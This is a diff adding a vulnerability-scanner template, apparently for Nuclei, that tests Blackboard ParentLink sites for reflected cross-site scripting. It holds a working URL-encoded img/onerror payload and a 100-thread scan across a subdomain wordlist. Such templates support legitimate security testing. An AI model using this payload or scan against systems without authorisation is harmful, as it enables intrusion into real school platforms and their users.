@@ -1,0 +1,39 @@
+id: parentlink-xss 1
+
+info:
+  name: Blackboard ParentLink Reflected XSS
+  author: r3naissance
+  severity: medium
+  tags: blackboard,parentlink,xss
+  reference: https://help.blackboard.com/Community_Engagement/Administrator/Release_Notes
+
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
+      - |
+        GET /main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E HTTP/1.1
+        Host: {{Subdomains}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+    matchers-condition: and
+    matchers:
+
+      - type: word
+        words:
+          - '<img src=c onerror=alert(8675309)>'
+        part: body
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+      - type: status
+        status:
+          - 200
